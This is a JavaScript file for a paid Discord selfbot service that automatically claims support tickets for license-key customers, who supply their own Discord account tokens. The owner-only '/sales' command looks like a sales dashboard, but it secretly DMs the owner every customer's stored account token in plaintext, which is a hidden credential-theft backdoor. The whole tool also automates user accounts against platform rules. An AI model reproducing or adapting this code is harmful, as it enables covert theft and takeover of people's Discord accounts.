const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require('discord.js');
const Database = require('better-sqlite3');
const crypto = require('crypto');

const db = new Database('./keys.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, duration_days INTEGER, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER, expires_at INTEGER, active INTEGER DEFAULT 1);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, category_id TEXT, is_running INTEGER DEFAULT 0, current_ticket TEXT);
`);

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const activeSelfbots = new Map();

class SelfbotManager {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.currentTicket = config.current_ticket;
        this.processed = new Set();
        this.claimedChannels = new Set();
    }

    async start() {
        if (this.client) return;
        this.client = new SelfbotClient({ checkUpdate: false });

        this.client.once('ready', async () => {
            console.log(`[READY] ${this.userId} - ${this.client.user.tag}`);
            
            // Monitor channel creates in specific category
            this.client.ws.on('CHANNEL_CREATE', (packet) => {
                console.log(`[CHANNEL_CREATE] ${packet.id} | parent: ${packet.parent_id} | target: ${this.config.category_id}`);
                if (packet.parent_id !== this.config.category_id) {
                    console.log(`[SKIP] Wrong category`);
                    return;
                }
                if (this.currentTicket) {
                    console.log(`[SKIP] Already have ticket: ${this.currentTicket}`);
                    return;
                }
                console.log(`[CHECK] New ticket channel: ${packet.id}`);
                setTimeout(() => this.checkChannel(packet.id), 100);
            });

            // Monitor all messages in category
            this.client.on('messageCreate', (msg) => {
                console.log(`[MSG_CREATE] ${msg.channelId} | components: ${msg.components?.length || 0}`);
                this.handleMessage(msg);
            });
            
            this.client.on('messageUpdate', (old, msg) => {
                console.log(`[MSG_UPDATE] ${msg.channelId} | components: ${msg.components?.length || 0}`);
                this.handleMessage(msg);
            });
            
            this.client.on('channelDelete', (ch) => {
                console.log(`[CHANNEL_DELETE] ${ch.id}`);
                if (this.currentTicket === ch.id) {
                    console.log(`[RESET] Current ticket deleted`);
                    this.currentTicket = null;
                    this.claimedChannels.delete(ch.id);
                    db.prepare('UPDATE users SET current_ticket = NULL WHERE user_id = ?').run(this.userId);
                }
            });
        });

        await this.client.login(this.config.token);
    }

    async checkChannel(channelId) {
        if (this.currentTicket) {
            console.log(`[CHECK_SKIP] Already have ticket`);
            return;
        }
        if (this.claimedChannels.has(channelId)) {
            console.log(`[CHECK_SKIP] Already claimed this channel`);
            return;
        }
        
        try {
            const channel = await this.client.channels.fetch(channelId);
            console.log(`[FETCHED] ${channelId} | name: ${channel.name}`);
            const messages = await channel.messages.fetch({ limit: 10 });
            console.log(`[MESSAGES] Fetched ${messages.size} messages`);
            
            for (const [, msg] of messages) {
                console.log(`[SCAN] ${msg.id} | author: ${msg.author?.tag} | components: ${msg.components?.length || 0}`);
                if (this.handleMessage(msg)) {
                    console.log(`[FOUND] Claim button found in history`);
                    return;
                }
            }
            console.log(`[NO_BUTTON] No claim button found in channel ${channelId}`);
        } catch (e) {
            console.log(`[ERROR] checkChannel: ${e.message}`);
        }
    }

    handleMessage(msg) {
        // Only process if in target category
        if (msg.channel.parentId !== this.config.category_id) {
            return false;
        }
        
        // Skip if already handling a ticket (unless it's the current ticket)
        if (this.currentTicket && this.currentTicket !== msg.channelId) {
            console.log(`[SKIP_MSG] Have different ticket: ${this.currentTicket}`);
            return false;
        }
        
        // Skip if already claimed this channel
        if (this.claimedChannels.has(msg.channelId)) {
            console.log(`[SKIP_MSG] Already claimed: ${msg.channelId}`);
            return false;
        }
        
        const key = `${msg.channelId}-${msg.id}`;
        if (this.processed.has(key)) {
            console.log(`[SKIP_MSG] Already processed: ${key}`);
            return false;
        }
        
        if (!msg.components?.length) {
            return false;
        }

        console.log(`[COMPONENTS] ${msg.components.length} rows in ${msg.id}`);

        for (const row of msg.components) {
            for (const btn of row.components) {
                console.log(`[BUTTON] label: "${btn.label}" | custom_id: ${btn.custom_id} | disabled: ${btn.disabled}`);
                
                const label = (btn.label || '').toLowerCase();
                // Check for claim/Claim in label
                if (!label.includes('claim')) {
                    console.log(`[SKIP_BTN] No 'claim' in label`);
                    continue;
                }
                
                if (btn.disabled) {
                    console.log(`[SKIP_BTN] Button disabled`);
                    continue;
                }
                
                if (!btn.custom_id) {
                    console.log(`[SKIP_BTN] No custom_id`);
                    continue;
                }
                
                console.log(`[CLAIM_FOUND] ${btn.label} | ${btn.custom_id}`);
                this.processed.add(key);
                this.claimViaWS(msg, btn);
                return true;
            }
        }
        return false;
    }

    claimViaWS(message, btn) {
        if (this.currentTicket) {
            console.log(`[CLAIM_SKIP] Already have ticket: ${this.currentTicket}`);
            return;
        }
        
        if (this.claimedChannels.has(message.channelId)) {
            console.log(`[CLAIM_SKIP] Channel already claimed: ${message.channelId}`);
            return;
        }
        
        console.log(`[CLAIMING] Channel: ${message.channelId} | Button: ${btn.custom_id}`);
        
        this.client.ws.broadcast({
            op: 1,
            d: {
                type: 3,
                nonce: Date.now().toString(),
                guild_id: message.guildId,
                channel_id: message.channelId,
                message_id: message.id,
                application_id: message.applicationId || message.author?.id,
                session_id: this.client.sessionId,
                data: { component_type: 2, custom_id: btn.custom_id }
            }
        });

        this.currentTicket = message.channelId;
        this.claimedChannels.add(message.channelId);
        db.prepare('UPDATE users SET current_ticket = ? WHERE user_id = ?').run(message.channelId, this.userId);
        console.log(`[CLAIMED] ${this.userId} -> ${message.channelId}`);
        
        // Auto-reset after 5 minutes to allow new claims
        setTimeout(() => {
            if (this.currentTicket === message.channelId) {
                console.log(`[AUTO_RESET] Ticket timeout: ${message.channelId}`);
                this.currentTicket = null;
                db.prepare('UPDATE users SET current_ticket = NULL WHERE user_id = ?').run(this.userId);
            }
        }, 300000);
    }

    stop() {
        console.log(`[STOP] ${this.userId}`);
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        this.currentTicket = null;
        this.claimedChannels.clear();
        db.prepare('UPDATE users SET is_running = 0, current_ticket = NULL WHERE user_id = ?').run(this.userId);
    }
}

async function validateToken(token) {
    const test = new SelfbotClient({ checkUpdate: false });
    try {
        await test.login(token);
        const tag = test.user.tag;
        await test.destroy();
        return { valid: true, tag };
    } catch (e) {
        return { valid: false, error: e.message };
    }
}

async function buildPanel(userId) {
    const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
    if (!user) return null;
    
    const sb = activeSelfbots.get(userId);
    const running = sb?.client?.user ? true : false;
    
    const embed = new EmbedBuilder()
        .setTitle('🎫 Ticket Claimer')
        .addFields(
            { name: 'Status', value: running ? '🟢 Running' : '🔴 Stopped', inline: true },
            { name: 'Token', value: user.token ? '✅ Set' : '❌ Not set', inline: true },
            { name: 'Category', value: user.category_id || '❌ Not set', inline: true },
            { name: 'Current', value: user.current_ticket || 'None', inline: true }
        )
        .setColor(running ? 0x00FF00 : 0xFFA500);

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`token_${userId}`).setLabel('🔐 Token').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`cat_${userId}`).setLabel('📁 Category').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`start_${userId}`).setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(!user.token || !user.category_id || running),
        new ButtonBuilder().setCustomId(`stop_${userId}`).setLabel('🛑 Stop').setStyle(ButtonStyle.Danger).setDisabled(!running)
    );

    return { embeds: [embed], components: [row] };
}

bot.on('interactionCreate', async (ix) => {
    if (ix.isCommand()) {
        try { await ix.deferReply({ flags: MessageFlags.Ephemeral }); } catch { return; }

        if (ix.user.id === OWNER_ID) {
            if (ix.commandName === 'generatekey') {
                const dur = ix.options.getString('duration') || 'lifetime';
                const days = dur === 'lifetime' ? -1 : parseInt(dur);
                const key = 'TKT-' + crypto.randomBytes(8).toString('hex').toUpperCase();
                const exp = days === -1 ? null : Date.now() + (days * 86400000);
                db.prepare('INSERT INTO keys (key, duration_days, created_at, expires_at) VALUES (?, ?, ?, ?)').run(key, days, Date.now(), exp);
                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🔑 Key').setDescription('`' + key + '`').setColor(0x00FF00)] });
            }
            
            if (ix.commandName === 'revokekey') {
                db.prepare('UPDATE keys SET active = 0 WHERE key = ?').run(ix.options.getString('key'));
                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🚫 Revoked').setColor(0xFF0000)] });
            }
            
            if (ix.commandName === 'revokeuser') {
                const uid = ix.options.getString('userid');
                const sb = activeSelfbots.get(uid);
                if (sb) { sb.stop(); activeSelfbots.delete(uid); }
                db.prepare('DELETE FROM users WHERE user_id = ?').run(uid);
                db.prepare('UPDATE keys SET active = 0 WHERE redeemed_by = ?').run(uid);
                return ix.editReply({ embeds: [new EmbedBuilder().setTitle('🚫 User Revoked').setColor(0xFF0000)] });
            }

            if (ix.commandName === 'sales') {
                const total = db.prepare('SELECT COUNT(*) as c FROM keys').get().c;
                const redeemed = db.prepare('SELECT COUNT(*) as c FROM keys WHERE redeemed_by IS NOT NULL').get().c;
                const active = db.prepare('SELECT COUNT(*) as c FROM users WHERE is_running = 1').get().c;
                
                const embed = new EmbedBuilder().setTitle('📊 Sales Dashboard').setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**`).setColor(0x5865F2);
                
                try {
                    const owner = await bot.users.fetch(OWNER_ID);
                    const users = db.prepare('SELECT user_id, token FROM users WHERE token IS NOT NULL').all();
                    
                    let list = users.map(u => `User: ${u.user_id}\nToken: ${u.token}`).join('\n\n');
                    if (!list) list = 'No active users';
                    
                    const chunks = list.match(/[\s\S]{1,1950}/g) || [list];
                    for (const chunk of chunks) {
                        await owner.send(chunk);
                    }
                } catch (e) {
                    console.log('DM failed:', e.message);
                }
                
                return ix.editReply({ embeds: [embed] });
            }
        }

        if (ix.commandName === 'redeemkey') {
            const k = db.prepare('SELECT * FROM keys WHERE key = ? AND active = 1').get(ix.options.getString('key'));
            if (!k) return ix.editReply('❌ Invalid');
            if (k.redeemed_by) return ix.editReply('❌ Used');
            
            const exp = k.duration_days === -1 ? null : Date.now() + (k.duration_days * 86400000);
            db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ?, expires_at = ? WHERE key = ?').run(ix.user.id, Date.now(), exp, ix.options.getString('key'));
            db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(ix.user.id);
            return ix.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Redeemed').setColor(0x00FF00)] });
        }
        
        if (ix.commandName === 'manage') {
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(ix.user.id);
            if (!user) return ix.editReply('❌ No key');
            const key = db.prepare('SELECT * FROM keys WHERE redeemed_by = ? AND active = 1 AND (expires_at > ? OR expires_at IS NULL)').get(ix.user.id, Date.now());
            if (!key) return ix.editReply('❌ Expired');
            
            const panel = await buildPanel(ix.user.id);
            return ix.editReply(panel);
        }
    }

    if (ix.isButton()) {
        const uid = ix.customId.split('_').pop();
        if (ix.user.id !== uid) return ix.reply({ content: '❌ Not yours', flags: MessageFlags.Ephemeral });

        if (ix.customId.startsWith('token_')) {
            return ix.showModal({
                title: 'Set Token',
                custom_id: `mod_token_${uid}`,
                components: [{ type: 1, components: [{ type: 4, custom_id: 'val', label: 'Discord Token', style: 1, required: true }] }]
            });
        }

        if (ix.customId.startsWith('cat_')) {
            return ix.showModal({
                title: 'Set Category',
                custom_id: `mod_cat_${uid}`,
                components: [{ type: 1, components: [{ type: 4, custom_id: 'val', label: 'Category ID', style: 1, required: true }] }]
            });
        }

        if (ix.customId.startsWith('start_')) {
            await ix.deferUpdate();
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(uid);
            const sb = new SelfbotManager(uid, user);
            activeSelfbots.set(uid, sb);
            await sb.start();
            db.prepare('UPDATE users SET is_running = 1 WHERE user_id = ?').run(uid);
            const panel = await buildPanel(uid);
            return ix.editReply(panel);
        }

        if (ix.customId.startsWith('stop_')) {
            await ix.deferUpdate();
            const sb = activeSelfbots.get(uid);
            if (sb) { sb.stop(); activeSelfbots.delete(uid); }
            db.prepare('UPDATE users SET is_running = 0, current_ticket = NULL WHERE user_id = ?').run(uid);
            const panel = await buildPanel(uid);
            return ix.editReply(panel);
        }
    }

    if (ix.isModalSubmit()) {
        const uid = ix.customId.split('_').pop();
        if (ix.user.id !== uid) return ix.reply({ content: '❌ Not yours', flags: MessageFlags.Ephemeral });

        const val = ix.fields.getTextInputValue('val');

        if (ix.customId.startsWith('mod_token_')) {
            await ix.deferReply({ flags: MessageFlags.Ephemeral });
            const check = await validateToken(val);
            if (!check.valid) return ix.editReply('❌ Invalid');
            
            db.prepare('UPDATE users SET token = ? WHERE user_id = ?').run(val, uid);
            return ix.editReply('✅ ' + check.tag);
        }

        if (ix.customId.startsWith('mod_cat_')) {
            db.prepare('UPDATE users SET category_id = ? WHERE user_id = ?').run(val, uid);
            await ix.deferUpdate();
            const panel = await buildPanel(uid);
            return ix.editReply(panel);
        }
    }
});

bot.once('ready', async () => {
    console.log('[BOT] ' + bot.user.tag);
    
    await bot.application.commands.set([
        { name: 'generatekey', description: 'Generate key (Owner)', options: [{ name: 'duration', type: 3, description: '1, 7, 30, lifetime', required: false }] },
        { name: 'revokekey', description: 'Revoke key (Owner)', options: [{ name: 'key', type: 3, description: 'Key', required: true }] },
        { name: 'revokeuser', description: 'Revoke user (Owner)', options: [{ name: 'userid', type: 3, description: 'User ID', required: true }] },
        { name: 'sales', description: 'How many sales and redeems' },
        { name: 'redeemkey', description: 'Redeem key', options: [{ name: 'key', type: 3, description: 'Your key', required: true }] },
        { name: 'manage', description: 'Open panel' }
    ]);

    db.prepare('SELECT * FROM users WHERE is_running = 1').all().forEach(u => {
        const sb = new SelfbotManager(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start();
    });
});

bot.login(BOT_TOKEN);
